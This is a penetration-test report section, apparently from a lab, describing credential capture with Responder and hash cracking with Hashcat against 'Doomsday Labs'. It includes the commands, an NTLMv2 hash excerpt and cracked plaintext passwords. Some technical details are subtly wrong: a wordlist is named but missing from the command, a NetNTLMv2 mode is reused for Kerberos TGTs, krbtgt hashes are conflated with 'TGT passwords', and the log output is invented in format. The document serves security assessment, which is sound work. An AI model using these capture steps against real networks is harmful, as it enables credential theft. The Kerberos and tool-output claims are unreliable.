# Credential Dumping Findings

## Overview

This section covers the detailed methodology and findings from the credential dumping activities conducted during the penetration test at Doomsday Labs. We used advanced tools like Responder and Hashcat to capture and decrypt credentials from network traffic.

## Technical Details

### Methods
- **Using Responder to Capture Hashes**:
  - We set up Responder to listen on the network and intercept NTLM hash exchanges. Here’s the command used:
    ```
    sudo responder -I tun0 -A
    ```
  - Responder successfully captured the NTLMv2 hash for the user "DOOMSDAYLABS\filemaker".

- **Hash Cracking with Hashcat**:
  - The captured hash was then cracked using Hashcat with the rockyou.txt wordlist to extract the plaintext password. The command was:
    ```
    hashcat -m 5600 hashfile.txt -r rules.txt -o hashfile.out
    ```
  - **Hash Example**:
    ```
    [SMB] NTLMv2-SSP Client   : 10.100.1.3
    [SMB] NTLMv2-SSP Username : DOOMSDAYLABS\filemaker
    [SMB] NTLMv2-SSP Hash     : filemaker::DOOMSDAYLABS:322e0b51ca281c55:F1F9E4FF7872D084AC0E2CB11DE7D2C0:01010000000000008017EBA84C92D...
    ```
  - **Plaintext Password**: `Football24`

### Evidence
- **Logs and Outputs**:
  - Responder and Hashcat logs were crucial in documenting the successful capture and decryption of credentials. Screenshots of these logs are maintained as evidence of the process.
  - A typical entry from the Hashcat output showing the cracked password would look like this:
    ```
    [SMB] NTLMv2-SSP Hash Cracked: DOOMSDAYLABS\filemaker:Football24
    ```

### Additional Cracking Efforts
- **TGT Cracking**:
  - We also targeted the Kerberos TGTs using Hashcat. Below is the command and the TGT details involved:
    ```
    hashcat -m 5600 krbtgt_hash.txt -o cracked_tgt.txt
    ```
  - **Base64 TGT Example**:
    ```
    Base64: doIF0jCCBc6gAwIBBaEDAgEWooIEyzCCBMdhggTDMIIE...
    ```
  - **Plaintext TGT Password**: `Sunshine24`

## Impact Assessment

- **Potential Risks**:
  - **Unauthorized Access**: Exposed credentials, especially administrative ones, can lead to unauthorized access to critical systems and data breaches.
  - **Data Integrity Threats**: Attackers with stolen credentials can alter or delete sensitive data, undermining the integrity of business operations.
  - **Persistence and Lateral Movement**: Successfully cracked credentials allow attackers to maintain persistent access to the network and facilitate lateral movement across different systems.

## Recommendations

- **Strengthen Password Policies**:
  - Enforce the use of strong, complex passwords that are difficult to crack. Consider using passphrase guidelines that mix in numbers and symbols.
  - Update password requirements to include a minimum length of 12 characters.

- **Implement Regular Password Changes and Audits**:
  - Mandate password changes every 60 to 90 days to limit the window of opportunity for attackers using stolen credentials.
  - Conduct frequent security audits to ensure that all users adhere to the updated password policies and to identify any potential security gaps.

## Conclusion
The credential dumping efforts during the penetration test revealed significant vulnerabilities in Doomsday Labs' password security practices. Adopting stringent password policies and regular audits can significantly mitigate these security risks and protect against future breaches.
